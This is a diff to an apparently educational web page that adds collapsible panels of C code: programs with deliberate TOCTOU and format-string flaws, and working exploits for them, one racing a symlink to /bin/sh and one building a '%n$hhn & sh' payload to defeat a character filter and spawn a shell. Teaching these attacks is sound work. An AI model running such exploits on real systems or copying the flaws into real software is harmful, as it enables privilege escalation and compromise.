+	int main(int argc, char ** argv)
+	{
+	    if (argc < 2)
+	    {
+	        printf("Usage: %s message\n", argv[0]);
+	        return 1;
+	    }
+
+	    char * cmd = "echo";
+	    struct stat sb;
+	    printf("Checking for local copy of echo...");
+	    if (stat(cmd, &sb) == 0) 
+	    {
+	        printf("local copy present! (Switching to /bin/echo)\n");
+	        cmd = "/bin/echo";
+	    }
+	    else printf("none present\n");
+	 
+	    if (additional_security_checks()) return 1;
+
+	    fflush(stdout);
+	    printf(" -> Invoking %s: ", cmd);
+	    char * args[] = { cmd, argv[1], NULL };
+	    execvp(cmd, args);
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec6" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <stdio.h>
+	#include <string.h>
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <sys/wait.h>
+	#include <stddef.h>
+
+	int main(){
+	    if (fork() == 0){
+	        unlink("./echo");
+	        putenv("PATH=./usr/local/bin:/usr/bin:/bin");
+	        execl("./tocttou", "tocttou", "-i", NULL);
+	    }
+	    else{
+	        int status;
+	        sleep(1);
+	        symlink("/bin/sh", "./echo");
+	        wait(&status);
+	    }
+	    return 0;
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec7" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <stdlib.h> // malloc, free, system
+	#include <string.h> // strchr, strlen
+	#include <stdio.h>  // printf, snprintf, fflush
+
+	int main(int argc, char ** argv)
+	{
+	    if (argc < 2)
+	    {
+	        printf("Usage: %s message\n", argv[0]);
+	        return 1;
+	    }
+	    const char * message = argv[1];
+
+	    char * forbidden = malloc(8 * sizeof(char));
+	    forbidden[0] = '&';
+	    forbidden[1] = '/';
+	    forbidden[2] = ';';
+	    forbidden[3] = '|';
+	    forbidden[4] = '>';
+	    forbidden[5] = '<';
+	    forbidden[6] = '\\';
+	    forbidden[8] = '#';
+
+	    printf("Checking \"");
+	    printf(message);
+	    printf("\" for forbidden chars...");
+
+	    for (int i = 0; i < 7; ++i)
+	    {
+	        if (strchr(message, forbidden[i]))
+	        {
+	            printf("ABORT: found '%c'\n", forbidden[i]);
+	            free(forbidden);
+	            return 1;
+	        }
+	    }
+	    printf("looks safe to me!\n");
+
+	    const char * prefix = "/bin/echo";
+	    printf(" -> Invoking %s: ", prefix);
+	    fflush(stdout);
+	    char echocmd[strlen(prefix)+1+strlen(message)+1];
+	    snprintf(echocmd, sizeof(echocmd), "%s %s", prefix, message);
+	    system(echocmd);
+
+	    free(forbidden);
+
+	    return 0;
+	}
+</code>
+	</pre>
+	</div>
+
+	<div id="cSec8" style="display: none; overflow-y: scroll; width: 1000px; padding-left: 50px;">
+	<pre>
+<code class="c++" style="overflow-x: hidden;">
+	#include <stdio.h>  // fprintf
+	#include <unistd.h> // execl
+	#include <stdlib.h> // system
+
+	int main(int argc, char * argv[])
+	{
+	    const char *find_n =
+	        "exec 2>/dev/null;"  // Ignore "Segmentation fault" messages.
+	        "for i in `seq 40`; do"
+	        "  if ./format %${i}\\$s | grep -qF '\"&'; then"
+	        "    /bin/echo -n $i >forbidden.txt;"
+	        "    break;"
+	        "  fi;"
+	        "done";     
+
+	    unlink("forbidden.txt");
+	    system(find_n);
+
+	    FILE *f;
+
+	    if (!(f = fopen("forbidden.txt", "r"))) {
+	        fprintf(stderr, "Could not determine position of forbidden in stack.\n");
+	        return 1;
+	    }
+
+	    char n[10] = {0};
+	    char message[256];
+
+	    fread(n, 1, sizeof n - 1, f);
+	    snprintf(message, sizeof message, ".%%%s$hhn & sh", n);
+
+	    fprintf(stderr, "n is '%s'; message will be: \"%s\"\n", n, message);
+	    puts("Press ENTER if the shell prompt does not immediately appear");
+
+	    execl("./format", "format", message, NULL);
+	    return 0;
+	}
+</code>
+	</pre>
+	</div>
+
 </div>
 <script type="text/javascript">
 	function showVis(id){
@@ -4013,6 +4871,16 @@ code {
 		var g = document.getElementById("javaSec10");
 		var h = document.getElementById("javaSec11");
 		var i = document.getElementById("javaSec12");
+		var xx = document.getElementById("cppSec1");
+		var yy = document.getElementById("cSec1");
+		var zz = document.getElementById("cSec2");
+		var aa = document.getElementById("cSec3");
+		var bb = document.getElementById("cSec4");
+		var cc = document.getElementById("cSec5");
+		var dd = document.getElementById("cSec6");
+		var ee = document.getElementById("cSec7");
+		var ff = document.getElementById("cSec8");
+
 		x.style.display = "none";
 		y.style.display = "none";
 		z.style.display = "none";
@@ -4025,6 +4893,15 @@ code {
 		g.style.display = "none";
 		h.style.display = "none";
 		i.style.display = "none";
+		xx.style.display = "none";
+		yy.style.display = "none";
+		zz.style.display = "none";
+		aa.style.display = "none";
+		bb.style.display = "none";
+		cc.style.display = "none";
+		dd.style.display = "none";
+		ee.style.display = "none";
+		ff.style.display = "none";
 
 		switch(one){
 			case "ins":
@@ -4062,6 +4939,33 @@ code {
 				break;
 			case "srv":
 				i.style.display = "block";
+				break;
+			case "AC":
+				xx.style.display = "block";
+				break;
+			case "bof":
+				yy.style.display = "block";
+				break;
+			case "sbof":
+				zz.style.display = "block";
+				break;
+			case "env":
+				aa.style.display = "block";
+				break;
+			case "senv":
+				bb.style.display = "block";
+				break;
+			case "toc":
+				cc.style.display = "block";
+				break;
+			case "stoc":
+				dd.style.display = "block";
+				break;
+			case "fmt":
+				ee.style.display = "block";
+				break;
+			case "sfmt":
+				ff.style.display = "block";
 				break;
 			default:
 				alert("Could not get ID");
